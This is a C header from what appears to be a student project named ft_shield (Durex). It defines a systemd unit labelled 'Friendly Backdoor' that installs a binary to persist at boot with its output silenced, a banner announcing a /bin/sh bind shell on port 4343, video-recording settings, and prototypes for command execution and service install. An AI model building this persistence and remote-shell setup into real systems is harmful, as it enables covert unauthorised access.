/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   Durex.h                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: banthony <banthony@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/11/06 13:29:18 by banthony          #+#    #+#             */
/*   Updated: 2019/12/04 11:34:01 by banthony         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef		DUREX_H
# define	DUREX_H

#include "utils.h"

# define READ_BUFFER_SIZE 4096

# define SERVICE_FILE_NAME "ft_shield.service"
# define SERVICE_PATH "/etc/systemd/system/"
# define SERVICE_FILE SERVICE_PATH SERVICE_FILE_NAME
# define SERVICE_INSTALL_PATH "/etc/systemd/system/multi-user.target.wants/"
# define SERVICE_INSTALL_FILE SERVICE_INSTALL_PATH SERVICE_FILE_NAME
# define SERVICE_BIN "/bin/ft_shield"

# define SERVICE_FILE_CONTENT	"[Unit]\n"						 		\
								"Description=Friendly Backdoor\n"		\
								"After=network-online.target\n"	 		\
								"Wants=network-online.target\n\n"		\
								"[Service]\n"							\
								"Type=forking\n"						\
								"ExecStart=/bin/ft_shield\n"			\
								"PIDFile=/var/lock/ft_shield.lock\n"	\
								"Restart=on-failure\n"					\
								"RestartSec=1\n"						\
								"WorkingDirectory=/\n"					\
								"StandardInput=null\n"					\
								"StandardOutput=null\n"					\
								"StandardError=null\n"					\
								"KillMode=mixed\n\n"					\
								"[Install]\n"							\
								"WantedBy=multi-user.target\n"

# define DUREX_HEADER	""	\
	"/* ************************************************************************** */\n"	\
	"/*                                                        :::      ::::::::   */\n"	\
	"/*      WELCOME TO ft_shield                                                  */\n"	\
	"/*                                                     :+:      :+:    :+:    */\n"	\
	"/*                                                    +:+ +:+         +:+     */\n"	\
	"/*      * 3 clients max                             +#+  +:+       +#+        */\n"	\
	"/*      * Enter 'help' to see all commands        +#+#+#+#+#+   +#+           */\n"	\
	"/*                                                     #+#    #+#             */\n"	\
	"/*                                                    ###   ########          */\n"	\
	"/* ************************************************************************** */\n"	\

# define DUREX_SHELL_HEADER ""	\
	"/* ************************************************************************** */\n"	\
	"/*                                                        :::      ::::::::   */\n"	\
	"/*      WELCOME TO ft_shield                                                  */\n"	\
	"/*                                                     :+:      :+:    :+:    */\n"	\
	"/*                                                    +:+ +:+         +:+     */\n"	\
	"/*      * Spawned /bin/sh on port 4343              +#+  +:+       +#+        */\n"	\
	"/*                                                +#+#+#+#+#+   +#+           */\n"	\
	"/*                                                     #+#    #+#             */\n"	\
	"/*                                                    ###   ########          */\n"	\
	"/* ************************************************************************** */\n"	\

# define MAX_CLIENT 3

# define VIDEO_RECORD_TIME 5

# define VIDEO_RECORD_LIMIT 6

#define EXEC_COMMAND(CMD) exec_command(CMD, NAMEOF(CMD)" ...", NULL, -1)

#define EXEC_COMMAND_DUP(CMD, FD) exec_command(CMD, NAMEOF(CMD)" ...", NULL, FD)

t_bool	exec_command(char **command, char *info, char **env, int fd);
void	install_service(char *bin_path);
t_bool	durex_is_installed(void);
t_bool	uninstall_service(void);

#endif
